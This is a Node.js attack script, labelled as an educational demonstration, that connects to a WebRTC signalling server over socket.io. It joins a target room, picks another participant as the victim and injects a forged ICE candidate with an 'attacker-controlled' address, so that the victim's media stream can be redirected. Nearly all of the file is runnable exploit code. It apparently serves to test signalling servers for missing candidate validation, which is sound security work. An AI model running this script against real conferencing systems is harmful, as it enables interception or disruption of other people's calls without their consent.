/**
 * ICE Injection Attack Demonstration
 * 
 * This script demonstrates how an attacker can inject fake ICE candidates
 * to redirect media streams in a vulnerable WebRTC system.
 * 
 * ⚠️ FOR EDUCATIONAL PURPOSES ONLY
 */

const io = require('socket.io-client');

const BACKEND_URL = process.env.BACKEND_URL || 'http://localhost:4000';
const TARGET_ROOM = process.argv[2] || 'test-room';

console.log('═══════════════════════════════════════════════════');
console.log('🔴 ICE INJECTION ATTACK DEMONSTRATION');
console.log('═══════════════════════════════════════════════════\n');

console.log(`🎯 Target Room: ${TARGET_ROOM}`);
console.log(`📡 Backend URL: ${BACKEND_URL}\n`);

const attackerSocket = io(BACKEND_URL, {
    reconnection: false,
    timeout: 10000
});

attackerSocket.on('connect', () => {
    console.log('✅ Attacker connected to server');
    console.log(`🔑 Attacker Socket ID: ${attackerSocket.id}\n`);

    // Join the target room
    attackerSocket.emit('join', {
        roomId: TARGET_ROOM,
        user: { id: 'attacker-' + Date.now(), name: 'Attacker Bot' }
    });

    console.log('📨 Joining target room...\n');
});

attackerSocket.on('room-state', (state) => {
    console.log('📊 Room State Received:');
    console.log(`   Participants: ${state.participants.length}`);
    state.participants.forEach(p => {
        console.log(`   - ${p.name} (${p.socketId})`);
    });
    console.log('');

    // Find victim (anyone who's not the attacker)
    const victim = state.participants.find(p => p.socketId !== attackerSocket.id);

    if (victim) {
        console.log(`🎯 Target Identified: ${victim.name}`);
        console.log(`   Socket ID: ${victim.socketId}\n`);

        // Wait a bit, then inject fake ICE candidate
        setTimeout(() => {
            injectFakeCandidate(victim.socketId);
        }, 2000);
    } else {
        console.log('⚠️  No other participants found in room');
        console.log('   Waiting for victim to join...\n');
    }
});

function injectFakeCandidate(targetSocketId) {
    console.log('💉 INJECTING FAKE ICE CANDIDATE');
    console.log('═══════════════════════════════════════════════════\n');

    const fakeCandidate = {
        targetSocketId: targetSocketId,
        signal: {
            type: 'candidate',
            candidate: 'candidate:1234567890 1 udp 2122260223 192.168.100.666 54321 typ host generation 0',
            sdpMLineIndex: 0,
            sdpMid: '0'
        }
    };

    console.log('📦 Fake Candidate Details:');
    console.log(`   IP: 192.168.100.666 (attacker-controlled)`);
    console.log(`   Port: 54321`);
    console.log(`   Type: host\n`);

    attackerSocket.emit('p2p-ice-candidate', fakeCandidate);

    console.log('✅ Fake candidate sent to server');
    console.log('🔍 Monitoring for acceptance...\n');
}

attackerSocket.on('p2p-ice-candidate', (data) => {
    console.log('📨 ICE Candidate Received from Server:');
    console.log(`   From: ${data.senderSocketId}`);
    console.log(`   Candidate: ${data.signal.candidate}\n`);

    if (data.signal.candidate && data.signal.candidate.includes('192.168.100.666')) {
        console.log('🚨 ATTACK SUCCESSFUL! 🚨');
        console.log('═══════════════════════════════════════════════════');
        console.log('Fake candidate was accepted by the server!');
        console.log('Victim\'s media stream could be redirected.');
        console.log('═══════════════════════════════════════════════════\n');
    }
});

attackerSocket.on('user-joined', (data) => {
    console.log(`👤 New user joined: ${data.user.name} (${data.socketId})`);
    console.log('   Preparing to inject fake candidate...\n');

    setTimeout(() => {
        injectFakeCandidate(data.socketId);
    }, 2000);
});

attackerSocket.on('connect_error', (error) => {
    console.error('❌ Connection Error:', error.message);
    process.exit(1);
});

attackerSocket.on('disconnect', () => {
    console.log('\n🔌 Disconnected from server');
});

// Cleanup after 30 seconds
setTimeout(() => {
    console.log('\n⏱️  Attack demonstration timeout (30s)');
    console.log('🛑 Terminating attack script\n');
    attackerSocket.disconnect();
    process.exit(0);
}, 30000);

console.log('⏳ Attack script running... (will auto-terminate in 30s)');
console.log('   Press Ctrl+C to stop manually\n');
